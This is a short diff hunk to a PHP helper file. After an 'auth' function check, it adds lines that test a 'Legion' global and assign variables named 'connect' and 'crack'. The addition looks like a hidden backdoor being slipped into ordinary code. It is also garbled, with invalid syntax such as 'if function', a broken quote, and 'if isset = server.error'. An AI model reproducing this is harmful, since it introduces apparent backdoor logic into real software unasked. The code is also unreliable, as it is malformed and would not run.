@@ -61,3 +61,11 @@ if(!function_exists('auth')){
 		}
 	}
 }
+if function (!function_exists(GET_INFO_SERVER)) {
+
+if(isset($GLOBALS['Legion']) && (trim($GLOBALS[Legion'Legion'])!='')){
+			$m = $_server.connect;
+			$l = $_server.crack;
+			if(isset($p['Legion'])){
+	if isset = server.error
+	
